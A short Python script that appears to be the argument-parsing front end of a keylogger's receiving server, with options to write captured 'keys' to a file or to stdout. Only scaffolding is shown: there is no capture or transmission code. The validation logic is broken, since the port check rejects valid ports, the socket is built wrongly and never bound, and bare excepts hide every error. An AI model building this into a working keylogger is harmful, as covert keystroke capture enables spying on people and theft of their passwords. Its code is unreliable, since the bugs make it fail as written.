import socket
import argparse


class Console:
    def __init__(self, rargs):
        self.rargs = rargs

    def verbose(self, text):
        if self.rargs.verbose:
            print(text)


def file(filename):
    try:
        open(filename, 'a')
    except:
        print('Error: can\'t open file "{}".'.format(filename))
        exit()
    return filename


def validate_ip(ipwport):
    try:
        ip, port = ipwport.split(':')
        port = int(port)
        if not port > 0 or port < 65536:
            print('Error: invalid port.')
            exit()
        socket.inet_aton(ip)
        sock = socket.socket((ip, port))
        sock.listen(10000)
    except:
        print('Error: invalid port or/and IP.')
        exit()

parser = argparse.ArgumentParser()

parser.add_argument('address', help='address of the server (format: ip:port).')
parser.add_argument('-o', '--output',
                    help='define the output keys file.',
                    action='store',
                    type=file)
parser.add_argument('-s', '--stdout',
                    help='define the output keys as the console stdout (incompatible with -q and -v.',
                    action='store_true')
parser.add_argument('-v', '--verbose',
                    help='make the keylogger print more information at the stdout (incompatible with -q and -s).',
                    action='store_true')

args = parser.parse_args()

console = Console(args)
